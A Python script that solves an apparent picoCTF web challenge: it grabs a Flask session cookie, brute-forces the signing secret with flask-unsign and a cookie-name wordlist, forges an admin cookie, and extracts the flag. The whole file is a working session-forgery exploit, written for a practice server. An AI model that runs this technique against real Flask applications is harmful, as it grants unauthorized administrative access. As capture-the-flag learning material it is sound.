import subprocess
import requests
import json
import re

url = "http://mercury.picoctf.net:18835"

# fetch cookie
s = requests.Session()
s.get(url)

cookie = s.cookies['session']
print("Cookie:", cookie)

# bruteforce with custom wordlist
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

with open("wordlist.txt", "w") as f:
    f.write("\n".join(cookie_names))

out = subprocess.run(['flask-unsign', '--unsign', '--cookie', cookie, '--wordlist', 'wordlist.txt'], capture_output=True)

secret = out.stdout.decode().strip()

print("Found secret:", secret)

# sign malicious cookie
payload = {"very_auth":"admin"}

out = subprocess.run(['flask-unsign', '--sign', '--cookie', json.dumps(payload), "--secret", secret], capture_output=True)

cookie = out.stdout.decode().strip()

# get flag
res = requests.get(url, cookies={ 'session': cookie })

print(re.findall(r'(picoCTF{.+})', res.text)[0])